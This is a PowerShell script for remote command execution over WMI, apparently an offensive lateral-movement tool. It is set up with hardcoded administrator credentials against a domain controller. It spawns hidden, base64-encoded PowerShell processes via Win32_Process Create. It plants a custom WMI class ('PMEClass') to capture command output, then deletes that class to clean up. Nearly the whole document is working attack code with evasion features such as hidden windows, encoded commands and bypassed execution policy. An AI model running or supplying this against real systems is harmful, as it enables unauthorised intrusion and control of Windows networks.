$Command = "whoami"
$Username = "administrator"
$Password = "Password123!"
$ComputerName = "dc01.security.local"
$LocalAuth = $True
$Class = "PMEClass"

    $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
	$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
	$wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
	IF ($wait){ 
		   try{$tcpClient.EndConnect($asyncResult)
		   $tcpClient.Close()}Catch{}


$LocalUsername = "$ComputerName\$UserName"
$LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($LocalUsername,$LocalPassword)


#Check access
$ErrorActionPreference = "silentlycontinue"
$osInfo = $null  # Reset $osInfo variable before each iteration

# OSinfo
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred

# If OSinfo true and command empty
if ($osinfo -and $Command -eq ""){

            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "SUCCESS "


}

# If OSinfo true and command not empty
elseif ($osinfo -and $Command -ne ""){

if ($LocalAuth){	
	function CreateScriptInstance([string]$ComputerName, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred
    
    if (!$classCheck) {
$Code = "CgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACIAXABcACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQBcAHIAbwBvAHQAXABjAGkAbQB2ADIAIgAsAFsAcw
B0AHIAaQBuAGcAXQA6ADoARQBtAHAAdAB5ACwAJABuAHUAbABsACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAFsAIgBfAF8AQwBMAEEAUwBTACIAXQAgAD0AIAAiAFAATQBFAEMAbABhAHMAcwAiAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFEAdQBhAGwAaQBmAGkAZQByAHMALgBBAGQAZAAoACIAUwB0AGEAdABpAGMAIgAs
ACQAdAByAHUAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBBAGQAZAAoACIAQwBvAG0AbQBhAG4AZABJAGQAIgAsAFsAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBpAG0AVAB5AHAAZQBdADoAOgBTAHQAcgBpAG4AZwAsACQAZgBhAGwAcwBlACkACgAgACAAIAAgAC
QAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAQwBvAG0AbQBhAG4AZABJAGQAIgBdAC4AUQB1AGEAbABpAGYAaQBlAHIAcwAuAEEAZABkACgAIgBLAGUAeQAiACwAJAB0AHIAdQBlACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwAuAEEAZABkACgAIgBDAG8AbQBtAGEA
bgBkAE8AdQB0AHAAdQB0ACIALABbAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEMAaQBtAFQAeQBwAGUAXQA6ADoAUwB0AHIAaQBuAGcALAAkAGYAYQBsAHMAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAdQB0ACgAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgA="


$CommandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $Code"
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred



# Required, if we proceed to quickly the class will not register and cause a break. Should probably loop this so we can move on as soon as the class is created
Start-Sleep -Seconds "10"
    
    }
    elseif ($classCheck -ne $null){
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred

    
    $wmiInstance.GetType() | Out-Null
    $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
    $wmiInstance.Dispose()
    return $CommandId
    }
}

$Commandid = CreateScriptInstance $ComputerName $cred $Class $LocalAuth


function GetScriptOutput([string]$ComputerName, [string]$CommandId, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    try {
            $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $cred 
        
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {
        Write-Host "Failed"
        #Write-Error $_.Exception.Message
    } 
    finally {
        if ($wmiInstance) {
            $wmiInstance.Dispose()
        }
    }
}

function ExecCommand([string]$ComputerName, [string]$Command, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
    
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred
 
    if ($process.ReturnValue -eq 0) {
        $started = Get-Date
        Do {
            if ($started.AddMinutes(2) -lt (Get-Date)) {
                Write-Host "PID: $($process.ProcessId) - Response took too long."
                break
            }
    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred
            
            Start-Sleep -Seconds 1
        } While ($watcher -ne $null)
        $scriptOutput = GetScriptOutput $ComputerName $ScriptCommandID $cred $Class $LocalAuth
        return $scriptOutput
    }
}

$commandString = $Command
$scriptCommandId = CreateScriptInstance $ComputerName $cred $Class $LocalAuth
if ($scriptCommandId -eq $null) {
    Write-Host "Script Command ID Failed" -ForegroundColor "Red"
}
$encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
$result = ExecCommand $ComputerName $encodedCommand $Cred $Class $LocalAuth
}
             
             $Time = (Get-Date).ToString("HH:mm:ss")
             Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
             Write-Host "   " -NoNewline
             
             try {$Ping = New-Object System.Net.NetworkInformation.Ping
             $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
             Write-Host ("{0,-16}" -f $IP) -NoNewline}
             catch { Write-Host ("{0,-16}" -f "") -NoNewline}
             
             Write-Host "   " -NoNewline
             Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
             Write-Host "   " -NoNewline
             Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
             Write-Host "   " -NoNewline
             Write-Host "[+] " -ForegroundColor "Green" -NoNewline
             Write-Host "SUCCESS "
             $result | Write-Output


if ($LocalAuth){
$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred | Out-Null
}

elseif (!$LocalAuth){
$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
}


}

elseif (!$osinfo){
    if ($SuccessOnly){return} 
        elseif (!$SuccessOnly) {
            
            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "ACCESS DENIED"
                
        }
    }
}
